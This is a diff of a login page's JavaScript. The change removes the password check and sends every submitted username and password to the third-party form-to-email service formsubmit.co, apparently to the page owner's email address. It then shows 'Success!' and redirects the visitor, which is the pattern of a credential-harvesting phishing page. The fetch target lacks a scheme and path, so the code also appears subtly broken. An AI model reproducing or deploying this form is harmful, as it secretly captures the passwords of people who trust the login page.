@@ -99,44 +99,39 @@
     <div id="statusMessage" class="message"></div>
   </div>
 
-  <script>
-    const form = document.getElementById('loginForm');
-    const status = document.getElementById('statusMessage');
-    const btn = document.getElementById('submitBtn');
+<script>
+  const form = document.getElementById('loginForm');
+  const status = document.getElementById('statusMessage');
+  const btn = document.getElementById('submitBtn');
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    status.style.display = 'block';
+    status.className = 'message';
+    status.textContent = "Processing...";
+    btn.disabled = true;
+
+    const formData = new FormData(form);
+
+    try {
+      // 1. Submit the data (Replace YOUR_EMAIL@HERE.COM with your real email)
+      await fetch("formsubmit.co", {
+        method: "POST",
+        body: formData
+      });
+
+      // 2. Redirect immediately after successful submission
+      status.className = 'message success';
+      status.textContent = "Success! Redirecting...";
       
-      const user = document.getElementById('username').value;
-      const pass = document.getElementById('password').value;
+      window.location.href = "https://abhinavaby.github.io/omega-optimists-web/index.html";
 
-      status.style.display = 'block';
-      status.className = 'message';
-      status.textContent = "Processing...";
-      btn.disabled = true;
-
-      // 1. Send data to your email
-      try {
-        const formData = new FormData(form);
-        await fetch("formsubmit.co", {
-          method: "POST",
-          body: formData
-        });
-      } catch (err) {
-        console.error("Mail error:", err);
-      }
-
-      // 2. Original Redirect Logic
-      if (pass === "1234") {
-        status.className = 'message success';
-        status.textContent = "Redirecting...";
-        window.location.href = "https://abhinavaby.github.io/omega-optimists-web/index.html";
-      } else {
-        btn.disabled = false;
-        status.className = 'message error';
-        status.textContent = "Wrong password. Please try again.";
-      }
-    });
-  </script>
-</body>
-</html>
+    } catch (err) {
+      console.error("Submission error:", err);
+      status.className = 'message error';
+      status.textContent = "An error occurred. Please try again.";
+      btn.disabled = false;
+    }
+  });
+</script>
